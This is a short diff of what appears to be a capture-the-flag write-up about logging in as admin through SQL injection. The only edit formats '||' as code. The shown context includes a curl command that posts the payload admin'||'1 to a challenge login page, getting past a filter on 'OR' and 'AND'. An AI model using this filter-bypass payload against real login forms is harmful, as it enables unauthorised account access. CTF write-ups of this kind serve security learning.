@@ -54,7 +54,7 @@ Need to log into admin, Maybe SQL-Injection? But, keywords like OR and AND are f
     <body>
     An Error occured
     
-I think the use of '||' instead of 'or':
+I think the use of ```'||'``` instead of 'or':
 
     ➜  ~  curl http://hack.bckdr.in/JUDGE/index.php --data "username=admin'||'1&password=123456"
 
